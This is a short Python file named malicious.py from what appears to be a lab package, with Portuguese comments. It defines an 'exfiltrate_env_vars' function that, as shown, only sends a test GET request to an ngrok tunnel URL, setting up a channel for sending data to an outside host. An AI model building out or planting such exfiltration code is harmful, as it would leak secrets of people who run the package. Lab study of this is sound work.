# artifact_lab_3_package_2b6a4744/malicious.py
# import requests

def exfiltrate_env_vars():
    url = "https://a7de-67-205-141-215.ngrok-free.app/log"  # Substitua pelo seu URL ngrok

    # Enviar uma requisição GET simples para testar a conexão
    try:
        response = requests.get(url)
        print(f"Server responded with status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send GET request: {e}")